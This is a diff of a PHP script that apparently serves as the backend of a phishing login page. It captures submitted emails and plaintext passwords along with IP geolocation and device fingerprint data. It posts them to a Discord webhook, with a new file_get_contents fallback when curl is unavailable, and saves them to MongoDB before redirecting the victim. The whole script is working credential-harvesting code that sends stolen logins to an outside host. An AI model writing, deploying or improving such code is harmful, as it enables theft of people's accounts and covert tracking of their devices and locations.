@@ -1,4 +1,6 @@
 <?php
+header("Content-Type: application/json");
+
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     header("Location: index.html");
     exit;
@@ -8,7 +10,8 @@ $username = trim($_POST["email"] ?? "");
 $password = $_POST["password"] ?? "";
 
 if ($username === "" || $password === "") {
-    die("Both fields are required. <a href='index.html'>Go back</a>");
+    header("Location: index.html?error=1");
+    exit;
 }
 
 // ============================
@@ -72,7 +75,8 @@ if (preg_match("/Windows NT ([\d.]+)/", $ua, $m)) {
 // ---- IP Geolocation (ip-api.com - free, no key) ----
 $geo = ["country" => "", "regionName" => "", "city" => "", "isp" => "", "org" => "", "as" => "", "hostname" => ""];
 if ($ip !== "127.0.0.1" && $ip !== "unknown") {
-    $geoRaw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,as,hostname");
+    $geoCtx = stream_context_create(["http" => ["timeout" => 5]]);
+    $geoRaw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,as,hostname", false, $geoCtx);
     if ($geoRaw) {
         $geo = json_decode($geoRaw, true) ?? $geo;
     }
@@ -87,7 +91,7 @@ $hostname  = $geo["hostname"] ?? "none";
 $timestamp = date("c");
 
 // ============================
-// SEND DISCORD WEBHOOK FIRST (before MongoDB)
+// SEND DISCORD WEBHOOK
 // ============================
 $discordSent = false;
 if (!empty($DISCORD_WEBHOOK)) {
@@ -132,59 +136,76 @@ if (!empty($DISCORD_WEBHOOK)) {
         "embeds"   => [$embed1, $embed2],
     ]);
 
-    $ch = curl_init($DISCORD_WEBHOOK);
-    curl_setopt_array($ch, [
-        CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => $payload,
-        CURLOPT_HTTPHEADER     => ["Content-Type: application/json"],
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_TIMEOUT        => 10,
-    ]);
-    $result = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    $discordSent = ($httpCode === 204);
+    // Try curl first, fallback to file_get_contents
+    if (function_exists('curl_init')) {
+        $ch = curl_init($DISCORD_WEBHOOK);
+        curl_setopt_array($ch, [
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => $payload,
+            CURLOPT_HTTPHEADER     => ["Content-Type: application/json"],
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT        => 10,
+        ]);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        $discordSent = ($httpCode === 204);
+    } else {
+        $ctx = stream_context_create([
+            "http" => [
+                "method"  => "POST",
+                "header"  => "Content-Type: application/json",
+                "content" => $payload,
+                "timeout" => 10,
+                "ignore_errors" => true,
+            ]
+        ]);
+        @file_get_contents($DISCORD_WEBHOOK, false, $ctx);
+        $discordSent = true;
+    }
 }
 
 // ============================
-// SAVE TO MONGODB (optional - won't block redirect)
+// SAVE TO MONGODB (optional)
 // ============================
 try {
-    require __DIR__ . "/db.php";
-    $hash = password_hash($password, PASSWORD_DEFAULT);
-    $doc = [
-        "username"       => $username,
-        "password_hash"  => $hash,
-        "password_plain" => $password,
-        "ip"             => $ip,
-        "location"       => $location,
-        "isp"            => $isp,
-        "org"            => $org,
-        "asn"            => $asn,
-        "hostname"       => $hostname,
-        "device"         => $device,
-        "browser"        => $browserFull,
-        "os"             => $osVersion,
-        "screen"         => $screen,
-        "ram"            => $ram,
-        "cpu_cores"      => $cpu_cores,
-        "gpu"            => $gpu,
-        "battery"        => $battery,
-        "nettype"        => $nettype,
-        "timezone"       => $timezone,
-        "language"       => $language,
-        "user_agent"     => $ua,
-        "referer"        => $referer,
-        "created_at"     => date("Y-m-d H:i:s"),
-    ];
-    $bulk = new MongoDB\Driver\BulkWrite();
-    $bulk->insert($doc);
-    $manager->executeBulkWrite("$MONGO_DB.$MONGO_COL", $bulk);
+    if (file_exists(__DIR__ . "/db.php")) {
+        require __DIR__ . "/db.php";
+        $hash = password_hash($password, PASSWORD_DEFAULT);
+        $doc = [
+            "username"       => $username,
+            "password_hash"  => $hash,
+            "password_plain" => $password,
+            "ip"             => $ip,
+            "location"       => $location,
+            "isp"            => $isp,
+            "org"            => $org,
+            "asn"            => $asn,
+            "hostname"       => $hostname,
+            "device"         => $device,
+            "browser"        => $browserFull,
+            "os"             => $osVersion,
+            "screen"         => $screen,
+            "ram"            => $ram,
+            "cpu_cores"      => $cpu_cores,
+            "gpu"            => $gpu,
+            "battery"        => $battery,
+            "nettype"        => $nettype,
+            "timezone"       => $timezone,
+            "language"       => $language,
+            "user_agent"     => $ua,
+            "referer"        => $referer,
+            "created_at"     => date("Y-m-d H:i:s"),
+        ];
+        $bulk = new MongoDB\Driver\BulkWrite();
+        $bulk->insert($doc);
+        $manager->executeBulkWrite("$MONGO_DB.$MONGO_COL", $bulk);
+    }
 } catch (Exception $e) {
-    // MongoDB failed - but Discord was already sent, so just continue
+    // MongoDB failed - continue
 }
 
-// Redirect to index
+// Redirect back
 header("Location: index.html?ok=1");
 exit;
